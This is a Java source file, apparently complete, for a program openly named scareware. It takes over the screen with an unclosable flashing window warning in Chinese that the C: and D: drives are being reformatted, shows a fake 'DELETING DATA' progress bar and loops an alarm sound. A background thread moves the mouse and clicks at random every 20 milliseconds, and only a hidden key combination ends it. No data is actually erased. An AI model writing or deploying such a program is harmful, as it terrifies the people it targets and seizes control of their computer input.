import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.File;
import javax.sound.sampled.*;

public class scareware {
    private static boolean isRunning = true;

    public static void main(String[] args) {
        playWarningSound("warning.wav"); 

        JFrame frame = new JFrame();
        frame.setUndecorated(true);
        frame.setExtendedState(JFrame.MAXIMIZED_BOTH);
        frame.setAlwaysOnTop(true);
        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        frame.getContentPane().setBackground(Color.BLACK);
        frame.setLayout(new GridBagLayout());
        // 1. GIAO DIỆN NGƯỜI DÙNG
        JLabel label = new JLabel("<html><center><h1 style='color:red; font-size:40px;'>警告！H這個系統正在被摧毀</h1>"
                + "<p style='color:white;'>正在重新格式化整個 C:\\ 和 D:\\ 磁碟機…</p></center></html>");
        
        JProgressBar pb = new JProgressBar(0, 100);
        pb.setPreferredSize(new Dimension(600, 40));
        pb.setStringPainted(true);
        pb.setForeground(Color.RED);

        frame.add(label);
        frame.add(pb);
        KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(new KeyEventDispatcher() {
            @Override
            public boolean dispatchKeyEvent(KeyEvent e) {
                if (e.getID() == KeyEvent.KEY_PRESSED) {
                    if ((e.getKeyCode() == KeyEvent.VK_X) && 
                        ((e.getModifiersEx() & (InputEvent.CTRL_DOWN_MASK | InputEvent.SHIFT_DOWN_MASK)) != 0)) {
                        isRunning = false;
                        System.exit(0);
                    }
                }
                return false;
            }
        });

        frame.setVisible(true);

        // 2. ROBOT CHẶN CHUỘT
        new Thread(() -> {
    try {
        Robot robot = new Robot();
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        int width = (int) screenSize.getWidth();
        int height = (int) screenSize.getHeight();
        java.util.Random random = new java.util.Random();

        while (isRunning) {
            int x = random.nextInt(width);
            int y = random.nextInt(height);
            robot.mouseMove(x, y);

            robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
            robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);

            Thread.sleep(20);
        }
    } catch (Exception e) {}
}).start();

        // 3. THANH TIẾN TRÌNH FAKE
        Timer timer = new Timer(100, new ActionListener() {
            int progress = 0;
            @Override
            public void actionPerformed(ActionEvent e) {
                progress++;
                pb.setValue(progress);
                pb.setString("DELETING DATA... " + progress + "%");
                if (progress % 2 == 0) {
                    frame.getContentPane().setBackground(Color.RED);
                    label.setForeground(Color.BLACK);
                } else {
                    frame.getContentPane().setBackground(Color.BLACK);
                    label.setForeground(Color.RED);
                }

                if (progress >= 100) {
                    ((Timer)e.getSource()).stop();
                    isRunning = false; 
                    JOptionPane.showMessageDialog(null, "資料已完全清除。!");
                    System.exit(0);
                }
            }
        });
        timer.start();
    }

    public static void playWarningSound(String filePath) {
        new Thread(() -> {
            try {
                File soundFile = new File(filePath);
                if (!soundFile.exists()) {
                    System.out.println("Không tìm thấy file: " + filePath);
                    return;
                }
                AudioInputStream audioInputStream = AudioSystem.getAudioInputStream(soundFile.getAbsoluteFile());
                Clip clip = AudioSystem.getClip();
                clip.open(audioInputStream);
                clip.loop(Clip.LOOP_CONTINUOUSLY);
                clip.start();
            } catch (Exception e) {
                System.out.println("Lỗi âm thanh: " + e.getMessage());
            }
        }).start();
    }
}